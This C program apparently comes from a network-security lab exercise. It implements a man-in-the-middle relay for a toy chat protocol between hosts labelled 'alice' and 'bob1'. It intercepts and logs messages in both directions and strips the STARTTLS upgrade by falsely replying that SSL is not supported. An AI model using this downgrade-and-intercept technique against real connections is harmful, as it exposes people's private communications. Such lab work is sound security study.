#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <openssl/ssl.h>
#include <netdb.h>
#include <openssl/err.h>

#define SERVER_IP "127.0.0.1"
#define SERVER_PORT 9091

#define MITM_IP "127.0.0.2"
#define MITM_PORT 9091

char *fhostname(char *hostname)
{

    struct hostent *host_info = gethostbyname(hostname);
    printf("set one\n");

    if (host_info != NULL)
    {
        printf("Hostname: %s\n", hostname);
        printf("IP Address: %s\n", inet_ntoa(*(struct in_addr *)host_info->h_addr_list[0]));
    }
    else
    {
        printf("Failed to resolve hostname %s\n", hostname);
    }

    return inet_ntoa(*(struct in_addr *)host_info->h_addr_list[0]);
}

int main()
{

    // create a new TCP socket
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0)
    {
        perror("socket() failed");
        exit(EXIT_FAILURE);
    }

    // bind to a local address and port
    struct sockaddr_in server_addr = {0};
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    server_addr.sin_port = htons(MITM_PORT);
    if (bind(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0)
    {
        perror("bind() failed");
        exit(EXIT_FAILURE);
    }

    // listen for incoming connections
    if (listen(sockfd, 5) < 0)
    {
        perror("listen() failed");
        exit(EXIT_FAILURE);
    }

    // accept incoming connections and handle them
    printf("Meet Vyas\n");
    while (1)
    {
        printf("while Meet Vyas\n");

        // accept a new connection
        struct sockaddr_in client_addr = {0};
        socklen_t client_addr_len = sizeof(client_addr);
        printf("Meet Vyas before acceot \n");
        int clientfd = accept(sockfd, (struct sockaddr *)&client_addr, &client_addr_len);
        printf("Meet Vyas after\n");
        if (clientfd < 0)
        {
            perror("accept() failed");
            continue;
        }
        printf("Meet Vyas\n");
        char buffer1[1024] = {0};
        int valread = read(clientfd, buffer1, sizeof(buffer1));
        printf("Client >>>>>> %s\n", buffer1);
        int send_flag = send(clientfd, "chat_ok_reply", sizeof("chat_ok_reply"), 0);
        printf("Server >>>>>> chat_ok_reply\n");
        if (send_flag == -1)
        {
            printf("Sending Failed\n");
            // what to do ????
        }

        // connecting to original server

        int original_sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (original_sockfd < 0)
        {
            perror("socket() failed");
            exit(EXIT_FAILURE);
        }

        // connect to the server
        struct sockaddr_in ori_server_addr = {0};
        ori_server_addr.sin_family = AF_INET;
        ori_server_addr.sin_port = htons(SERVER_PORT);
        ori_server_addr.sin_addr.s_addr = inet_addr(fhostname("bob1"));
        if (connect(original_sockfd, (struct sockaddr *)&ori_server_addr, sizeof(ori_server_addr)) < 0)
        {
            perror("connect() failed");
            exit(EXIT_FAILURE);
        }
        int sending_flag_client = send(original_sockfd, "chat_hello", sizeof("chat_hello"), 0);
        printf("Client >>>>> chat_hello\n");
        char buffer_in[1024] = {0};
        valread = read(original_sockfd, buffer_in, sizeof(buffer_in));
        printf("Server >>>>>%s\n", buffer_in);

        // connecting to original server ends

        int wfg = 1;
        while (wfg)
        {
            printf("Client >>>>>> ");
            valread = read(clientfd, buffer1, sizeof(buffer1));

            printf("%s\n", buffer1);
            if (strcmp(buffer1, "chat_START_SSL") == 0)
            {

                send_flag = send(clientfd, "chat_START_SSL_NOT_SUPPORTED", sizeof("chat_START_SSL_NOT_SUPPORTED"), 0);
                printf("Server MITM >>>>>> chat_START_SSL_NOT_SUPPORTED\n");
                if (send_flag == -1)
                {
                    printf("Sending Failed\n");
                }

                continue;
            }

            send_flag = send(original_sockfd, buffer1, sizeof(buffer1), 0);

            if (send_flag == -1)
            {
                printf("Sending Failed\n");
            }
            if (strcmp(buffer1, "chat_close") == 0)
            {
                break;
            }

            valread = read(original_sockfd, buffer1, sizeof(buffer1));

            printf("Server >>>>> ");
            printf("%s\n", buffer1);

            send_flag = send(clientfd, buffer1, sizeof(buffer1), 0);

            if (send_flag == -1)
            {
                printf("Sending Failed\n");
                // what to do ????
            }
            if (strcmp(buffer1, "chat_close") == 0)
            {
                break;
            }
        }

        close(original_sockfd);
        close(clientfd);
    }

    return 0;
}